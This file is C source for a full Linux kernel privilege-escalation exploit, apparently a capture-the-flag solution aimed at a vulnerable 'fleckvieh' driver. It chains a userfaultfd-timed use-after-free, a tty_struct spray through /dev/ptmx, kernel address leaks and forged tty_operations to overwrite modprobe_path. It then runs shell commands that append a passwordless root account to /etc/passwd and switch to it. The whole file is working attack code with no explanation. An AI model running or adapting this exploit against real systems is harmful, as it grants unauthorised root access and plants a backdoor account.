#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <string.h>
#include <sched.h>
#include "tty.h"
#define PAGE 0x1000
#define log_info(...) { \
    printf("[*] "); \
    printf(__VA_ARGS__); \
    putchar('\n'); \
};
#define log_err(...) { \
    printf("[!] "); \
    printf(__VA_ARGS__); \
    putchar('\n'); \
};
#define errExit(...){ \
    log_err(__VA_ARGS__); \
    exit(-1); \
};

#define pause() getchar()
#define DEVICE_NAME "fleckvieh"
#define CMD_ADD 0xf1ec0001
#define CMD_DEL 0xf1ec0002
#define CMD_GET 0xf1ec0003
#define CMD_SET 0xf1ec0004

typedef struct {
  int id;
  size_t size;
  char *data;
} request_t;

int global_fd;
int64_t buf_[0x80];
char read_buf[0x400];
request_t req = {
    .id = 0,
    .size = 0x2e0 ,
};
void open_dev(){
    global_fd = open("/dev/"DEVICE_NAME,O_RDWR);
    if(global_fd < 0)
        errExit("open");
    log_info("Opened dev file");
}
int blob_add(){
    return ioctl(global_fd,CMD_ADD,&req);
}
int blob_del(){
    return ioctl(global_fd,CMD_DEL,&req);
}
int blob_get(){
    return ioctl(global_fd,CMD_GET,&req);
}
int blob_set(){
    return ioctl(global_fd,CMD_SET,&req);
}
int ptmx_fd;
int spray[50];
int64_t _text;
int64_t tty_ops_addr;
int64_t tty_driver;
_Bool overwrite = 0;
int64_t* fake_tty_struct;
static void* fault_handler_thread(void *arg)
{
    log_info("Entered fault_handler_thread");
    static struct uffd_msg msg;   // data read from userfaultfd
    struct uffdio_copy uffdio_copy_var;
    long uffd = (long)arg;        // userfaultfd file descriptor
    struct pollfd pollfd;         //
    int nready;                   // number of polled events
    unsigned long hogebuf;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    log_info("Polling...");
    while(poll(&pollfd, 1, -1) > 0){
      if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
          log_err("poll");
      // read an event
      if(read(uffd, &msg, sizeof(msg)) == 0)
          log_err("read");
      if(msg.event != UFFD_EVENT_PAGEFAULT)
          log_err("unexpected pagefault");
      log_err("page fault: %p",(void *)msg.arg.pagefault.address);
      log_info("Kfree");
      blob_del();
      for(size_t i=0;i<25;++i){
            spray[i]=open("/dev/ptmx",O_RDONLY | O_NOCTTY);
            if(spray[i] < 0)
                errExit("ptmx %zu",i);
      }
      if(overwrite){
            buf_[0] = 0x100005401;
            buf_[2] = tty_driver;
            buf_[3] = tty_ops_addr;
            log_info("Ok");
       }
    //Stop polling
      uffdio_copy_var.src = buf_; // Copy buf_ to page fault
      uffdio_copy_var.dst = msg.arg.pagefault.address & ~(PAGE-1);
      uffdio_copy_var.len = PAGE;
      uffdio_copy_var.mode = 0;
      if(ioctl(uffd, UFFDIO_COPY, &uffdio_copy_var) == -1)
            errExit("ioctl-UFFDIO_COPY");

      break;
    }
    log_info("Exit fault_handler_thread");
}

void register_userfaultfd_and_halt(void *addr_,void * (*handler)(void *)){
    log_info("Registering userfaultfd...");

    long uffd;  // userfaultfd file descriptor
    pthread_t thr; // ID of thread that handles page fault and continue exploit in another kernel thread
    struct uffdio_api uffdio_api_var;
    struct uffdio_register uffdio_register_var;
    int s;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); // create userfaultfd file descriptor
    if(uffd==-1){
        log_err("userfaultfd");
        exit(-1);
    }
    // enable uffd object via ioctl(UFFDIO_API)
    uffdio_api_var.api = UFFD_API ;
    uffdio_api_var.features = 0;
    if(ioctl(uffd, UFFDIO_API, &uffdio_api_var) == -1){
        log_err("ioctl-UFFDIO_API");
        exit(-1);
    }
    log_info("Mapping...");
    addr_ = mmap(addr_, PAGE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0); // set MAP_FIXED for memory to be mmaped on exactly specified addr.
    if(addr_ == MAP_FAILED){
        log_err("mmap");
        exit(-1);
    }
    log_info("Mapped %p",addr_);
    // specify memory region handled by userfaultfd via ioctl(UFFDIO_REGISTER)
    uffdio_register_var.range.start = addr_;
    uffdio_register_var.range.len = PAGE;
    uffdio_register_var.mode = UFFDIO_REGISTER_MODE_MISSING;
    if(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register_var) == -1){
        log_info("ioctl-UFFDIO_REGISTER");
        exit(-1);
    }    
    s = pthread_create(&thr, NULL, handler, (void*)uffd); // create thread
    if(s){
        log_err("pthread_create");
        exit(s);
    }
    log_info("Registered userfaultfd");
}
cpu_set_t  pwn_cpu;
int main(int argc,char** argv,char** envp){
    CPU_ZERO(&pwn_cpu);
    CPU_SET(0, &pwn_cpu);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
        errExit("sched_setaffinity");
    open_dev();
    req.size = 0x2e0;
    req.data = read_buf;
    req.id = blob_add();
    log_info("ID = %d",req.id);
    char* addr1 = (void *)0x117117000;
    register_userfaultfd_and_halt(addr1,fault_handler_thread);
    //Stage 1: Leak _text
    req.data = addr1;
    req.size = 0x30;
    blob_get();
    sleep(1);
    for(size_t i=0;i<25;++i)
        close(spray[i]);

    int64_t* leak = addr1+0x10;
    tty_driver = leak[0];
    _text = leak[1]-0xc3c3c0;
    log_info("Kernel's _text: 0x%lx",_text);
    log_info("tty driver @ 0x%lx",tty_driver);

    //Stage 2: Leak heap near
    req.size = 0x2e0;
    req.data = read_buf;
    req.id = blob_add();
    log_info("ID = %d",req.id);
    char* addr2 = (void *)0x117118000;
    register_userfaultfd_and_halt(addr2,fault_handler_thread);
    req.data = addr2;
    req.size = 0x40;
    blob_get();
    int64_t leak_heap = *(int64_t *)(0x117118000+0x38);
    log_info("Leak heap: 0x%lx",leak_heap);
    tty_ops_addr = leak_heap - 0x38 + 0x1f0400;
    sleep(1);

    //Stage3: Store tty_operations on the heap
    struct tty_operations fake_tty_ops = {0};
    fake_tty_ops.lookup = 0x0102030405060708;
    fake_tty_ops.ioctl = _text+0xb8c55;
    request_t tty_req = {0};
    for(size_t i=0;i<0x2000;++i){
        tty_req.size = 0x2e0;
        tty_req.id = ioctl(global_fd,CMD_ADD,&tty_req);
        tty_req.data = (char *)&fake_tty_ops,
        tty_req.size = sizeof(fake_tty_ops);
        ioctl(global_fd,CMD_SET,&fake_tty_ops);
    }
    log_info("Fake struct tty_operations maybe @ 0x%lx",tty_ops_addr);

    // Stage4: Overwrite
    fake_tty_struct = (void *)0x117119000;
    req.size = 0x2e0;
    req.data = read_buf;
    req.id = blob_add();
    log_info("ID = %d",req.id);
    register_userfaultfd_and_halt(fake_tty_struct,fault_handler_thread);
    req.data = (char *)fake_tty_struct;
    req.size = 0x20;
    overwrite = 1;
    blob_set();
    int64_t modprobe = _text+0xe37ea0; //
    int32_t* p = (int32_t *)"/tmp/vjp";
    for(size_t i = 0 ; i < 25;++i){
        ioctl(spray[i],p[0],modprobe);
        ioctl(spray[i],p[1],modprobe+4);
    }
    system("echo -e \"#!/bin/sh\necho 'vjp::0:0:root:/:/bin/sh' >> /etc/passwd\" > /tmp/vjp");
    system("chmod +x /tmp/vjp");
    system("echo -e '\x13\x37\x42\x42' > /tmp/pwn" ); //Non-ascii for /tmp/pwn
    system("chmod +x /tmp/pwn"); 
    system("/tmp/pwn" );  // trigger call modprobe_path
    system("grep vjp /etc/passwd" );
    system("su vjp");
}
